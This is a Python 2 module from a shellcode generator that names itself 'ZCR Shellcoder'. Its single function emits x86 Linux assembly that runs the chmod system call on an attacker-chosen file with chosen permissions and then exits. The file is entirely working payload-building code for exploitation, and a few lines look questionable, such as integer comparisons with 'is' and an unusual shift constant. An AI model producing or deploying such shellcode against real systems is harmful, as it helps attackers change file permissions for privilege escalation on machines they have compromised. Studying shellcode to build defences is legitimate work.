#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
import binascii
def run(file_to_perm,perm_num):
	perm_num = hex(int(perm_num, 8))
	if len(perm_num) % 2 is not 0:
		perm_num = perm_num.replace('0x','0x0')
	if len(perm_num) is 10:
		perm_num = perm_num + '\npop %ecx\n'

	if len(perm_num) is 8:
		perm_num = perm_num + '90\npop %ecx\nshr $0x8,%ecx\n'
	if len(perm_num) is 6:
		perm_num = perm_num + '9090\npop %ecx\nshr $0x10,%ecx\n'
	if len(perm_num) is 4:
		perm_num = perm_num + '909090\npop %ecx\nshr $0x10,%ecx\nshr $0x8,%ecx\n'
	perm_num = 'push $' + perm_num
	m = len(file_to_perm) - 1
	stack = ''
	while(m>=0):
	        stack += file_to_perm[m]
	        m -= 1
	stack = stack.encode('hex')
	shr_counter = 0 
	shr_counter = len(stack) % 8
	zshr_counter = shr_counter
	shr = None
	if shr_counter is 2:
		shr = '\npop %ebx\nshr    $0x12,%ebx\nshr    $0x8,%ebx\npush %ebx\n'
		stack = stack[0:2] + '909090' + stack[2:]
	if shr_counter is 4:
		shr = '\npop %ebx\nshr    $0x10,%ebx\npush %ebx\n'
		stack = stack[0:4] + '9090' + stack[4:]
	if shr_counter is 6:
		shr = '\npop %ebx\nshr    $0x8,%ebx\npush %ebx\n'
		stack = stack[0:6] + '90' + stack[6:]
	zshr = shr
	m = len(stack)
	n = len(stack) / 8
	file_shellcode = ''
	shr_counter = len(stack) % 8
	if shr_counter is 0:
		shr_n = 0
		r = ''
		while(n is not 0):
			if shr is not None:
				shr_n += 1
				zx = m - 8
				file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
				m -= 8
				n = n - 1
				shr = None
			if shr is None:
				shr_n += 1
				zx = m - 8
				file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
				m -= 8
				n = n - 1
		if zshr is None:
			file_z = file_shellcode
		if zshr is not None:
			rep1 = file_shellcode[:16]
			rep2 = rep1 + zshr
			file_z = file_shellcode.replace(rep1,rep2)
			
	shellcode = '''push   $0xf
pop    %%eax
%s
%s
mov    %%esp,%%ebx
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80'''%(perm_num,file_z)
	return shellcode

	
